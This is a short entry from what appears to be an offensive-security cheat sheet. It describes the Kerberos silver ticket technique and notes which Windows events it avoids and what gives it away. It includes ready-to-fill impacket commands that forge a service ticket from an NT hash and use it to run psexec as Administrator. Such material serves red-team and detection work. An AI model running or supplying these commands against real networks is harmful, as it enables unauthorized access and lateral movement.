---
id: silver-ticket
title: Silver Ticket (forge a TGS from a service account hash)
section: Microsoft Windows Kerberos — TCP 88
phase: Credential Access
attack:
  tactic: TA0006
  techniques: [T1558.002]
platform: [windows]
source: hacktheplanet §"Microsoft Windows Kerberos — TCP 88"
pair: silver-ticket-4769
---

With the NT hash of a *service* account (or a machine account for CIFS/HOST),
forge a TGS for that one service offline and present it straight to the service —
the DC is never contacted, so there is no `4768` *and* no `4769`. Quieter and more
targeted than a golden ticket (it opens only that one service) but it needs no DA,
just the service hash. Mimikatz's default 10-year lifetime is the give-away.

```sh
impacket-ticketer -nthash {{nthash}} -domain-sid <domain-sid> -domain {{domain}} -spn cifs/{{hostname}} Administrator
KRB5CCNAME=Administrator.ccache impacket-psexec -k -no-pass {{domain}}/Administrator@{{hostname}}
```
